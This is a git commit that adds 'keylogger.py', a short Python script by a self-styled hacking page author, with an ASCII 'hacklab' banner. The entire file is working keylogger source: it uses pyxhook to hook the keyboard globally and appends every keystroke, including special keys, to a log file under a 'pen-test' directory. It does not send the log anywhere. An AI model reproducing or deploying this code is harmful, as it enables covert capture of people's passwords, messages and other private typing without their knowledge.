d225b8c664762cc067ab274224490ad4bc6ff2db
mohamed larit <mohamedmr1root@gmail.com>
2017-09-08 08:08:10 -0700

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python
+
+import pyxhook
+
+
+"""
+	*--------------------------------------*
+	|       programmed by : mohamed        |
+	|           fb.me/hack1lab             |
+	*--------------------------------------*
+	   _                _    _       _     
+	  | |__   __ _  ___| | _| | __ _| |__  
+	  | '_ \ / _` |/ __| |/ / |/ _` | '_ \ 
+	  | | | | (_| | (__|   <| | (_| | |_) |
+	  |_| |_|\__,_|\___|_|\_\_|\__,_|_.__/ 
+	
+	               Keylogger
+	              -----------
+
+"""
+
+
+
+log_file='/home/pen-test/txt_files/file.log'
+
+def keypress(event):
+	log=open(log_file,'a')
+	if event.Key == 'space':
+		log.write(' ')
+	elif event.Key == 'Return':
+		log.write('\n')
+	elif len(event.Key) != 1:
+		log.write('[ '+event.Key+' ]')
+	else:
+		log.write(event.Key)
+
+key=pyxhook.HookManager()
+
+key.KeyDown=keypress
+
+key.HookKeyboard()
+
+key.start()
